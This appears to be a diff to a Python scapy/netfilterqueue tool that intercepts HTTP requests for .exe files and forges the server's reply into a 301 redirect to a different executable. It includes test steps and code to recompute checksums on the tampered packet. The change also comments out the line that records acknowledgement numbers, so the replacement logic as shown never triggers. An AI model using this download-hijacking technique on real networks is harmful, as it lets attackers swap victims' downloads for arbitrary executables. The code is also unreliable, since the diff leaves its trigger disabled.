@@ -11,14 +11,24 @@
 #########################################################################
 
 
+# Steps to test this tool
+# 1. cd /var/www/html
+# 2. sudo touch testfile.exe
+# 3. sudo python3 -m http.server 80
+# 4. run this script with superuser priviliges.
+# 5. open any browser
+# 6. visit localhost or your host ip to check whether site is up.
+# 7. request localhost/testfile.exe
+# 8. now you should get prompt to download brave browser instead of testfile.exe
+
+
 from os import remove
 from subprocess import call
 import netfilterqueue
 import scapy.all as scapy
 
 
-SPOOF_WEBSITE = b'www.google.com'
-SPOOF_RDATA = b'10.0.2.15'
+REDIRECT = b'https://referrals.brave.com/latest/BraveBrowserSetup.exe'
 
 ############################### Functions ############################### 
 def forward_packets():
@@ -69,22 +79,32 @@ def process_packet(packet):
         if scapy_pkt[scapy.TCP].dport == 80:
             if b".exe" in scapy_pkt[scapy.Raw].load:
                 print('[*] EXE Request Detected!')
-                ack_list.append(scapy_pkt[scapy.TCP].ack)
-                print(scapy_pkt.show())
-                print()
+                # ack_list.append(scapy_pkt[scapy.TCP].ack)
 
-            if b".txt" in scapy_pkt[scapy.Raw].load:
-                print('[*] TXT Request Detected!')
-                ack_list.append(scapy_pkt[scapy.TCP].ack)
-                print(scapy_pkt.show())
-                print()
+            # if b".txt" in scapy_pkt[scapy.Raw].load:
+            #     print('[*] TXT Request Detected!')
+            #     ack_list.append(scapy_pkt[scapy.TCP].ack)
+            #     # print(scapy_pkt.show())
+            # print()
 
         elif scapy_pkt[scapy.TCP].sport == 80:
             if scapy_pkt[scapy.TCP].seq in ack_list:
                 print('[*] Replacing File!\n')
                 ack_list.remove(scapy_pkt[scapy.TCP].seq)
+                scapy_pkt[scapy.Raw].load = f"HTTP/1.1 301 Moved Permanently\nLocation: {REDIRECT}\n\n"
+
+                # since now the packet has been tampered, the new 
+                # packet will have differet length and checksums
+                # so we'll delete these fields and scapy will 
+                # automatically calulate these for us.
+                del scapy_pkt[scapy.IP].len
+                del scapy_pkt[scapy.IP].chksum
+                del scapy_pkt[scapy.TCP].chksum
+                packet.set_payload(bytes(scapy_pkt))
+
                 print(scapy_pkt.show())
-                print()
+                print(packet)
+            print()
         
 
     packet.accept()
